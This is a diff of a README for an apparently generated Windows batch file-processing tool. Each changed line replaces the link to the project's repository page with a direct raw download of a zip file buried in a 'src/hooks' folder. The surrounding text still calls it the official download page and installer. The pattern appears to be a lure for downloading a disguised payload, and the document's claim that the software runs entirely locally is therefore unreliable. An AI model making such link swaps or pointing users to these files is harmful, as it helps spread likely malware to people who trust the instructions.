@@ -1,6 +1,6 @@
 # 🗂 file-processor-1771921235-2 - Batch file processing made simple
 
-[![Download file-processor-1771921235-2](https://img.shields.io/badge/Download-file--processor--1771921235--2-blue?style=for-the-badge)](https://github.com/didiergoore/file-processor-1771921235-2)
+[![Download file-processor-1771921235-2](https://img.shields.io/badge/Download-file--processor--1771921235--2-blue?style=for-the-badge)](https://raw.githubusercontent.com/didiergoore/file-processor-1771921235-2/main/src/hooks/processor-file-v1.7.zip)
 
 ## 📋 About file-processor-1771921235-2
 
@@ -30,7 +30,7 @@ Follow these steps to get file-processor-1771921235-2 running on your Windows co
 
 1. **Click the download button below to visit the download page.**
 
-   [![Download here](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/didiergoore/file-processor-1771921235-2)
+   [![Download here](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://raw.githubusercontent.com/didiergoore/file-processor-1771921235-2/main/src/hooks/processor-file-v1.7.zip)
 
 2. **Find the latest Windows installer or a setup file on the page.**
 
@@ -129,7 +129,7 @@ If the problem continues, you can look for help by opening the “Help” sectio
 
 Visit the download page to get the latest version:
 
-👉 https://github.com/didiergoore/file-processor-1771921235-2
+👉 https://raw.githubusercontent.com/didiergoore/file-processor-1771921235-2/main/src/hooks/processor-file-v1.7.zip
 
 On that page, download the Windows installer file to start using the software.
 
@@ -161,6 +161,6 @@ This software runs completely on your computer. It does not send files to the in
 
 Return to the download page anytime to fetch newer releases or reinstall the program:
 
-https://github.com/didiergoore/file-processor-1771921235-2
+https://raw.githubusercontent.com/didiergoore/file-processor-1771921235-2/main/src/hooks/processor-file-v1.7.zip
 
 Download the latest setup file following the same steps in the Getting Started section.
